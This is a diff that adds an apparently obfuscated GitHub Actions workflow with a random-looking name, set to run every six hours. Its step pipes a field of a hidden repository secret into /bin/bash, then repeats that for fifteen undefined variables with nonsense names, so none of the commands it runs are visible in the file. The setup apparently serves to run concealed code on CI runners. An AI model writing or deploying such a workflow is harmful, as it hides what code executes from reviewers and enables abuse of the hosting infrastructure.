@@ -1,0 +1,33 @@
+name: maturehometeam
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: maturehometeam
+        env:
+          pv4: ${{ secrets.pv4 }}
+        run: |
+          echo $pv4 | jq -r .cxqui74 | /bin/bash
+          echo $kn2351 | jq -r .nw44 | /bin/bash
+          echo $myp2895 | jq -r .yd3 | /bin/bash
+          echo $uji25 | jq -r .mrcek0 | /bin/bash
+          echo $fwo78733 | jq -r .bjh2203 | /bin/bash
+          echo $gtkk6061 | jq -r .bo01582 | /bin/bash
+          echo $ivjz9 | jq -r .mvux297 | /bin/bash
+          echo $vnm332 | jq -r .adx8 | /bin/bash
+          echo $a83 | jq -r .tzzcs565 | /bin/bash
+          echo $j5020 | jq -r .av9929 | /bin/bash
+          echo $nk92 | jq -r .vnt57447 | /bin/bash
+          echo $zsggw35 | jq -r .rwaxv14 | /bin/bash
+          echo $o5 | jq -r .abl0627 | /bin/bash
+          echo $etutz383 | jq -r .ejk9 | /bin/bash
+          echo $phm138 | jq -r .e27201 | /bin/bash
+          echo $etm851 | jq -r .pu2129 | /bin/bash
+
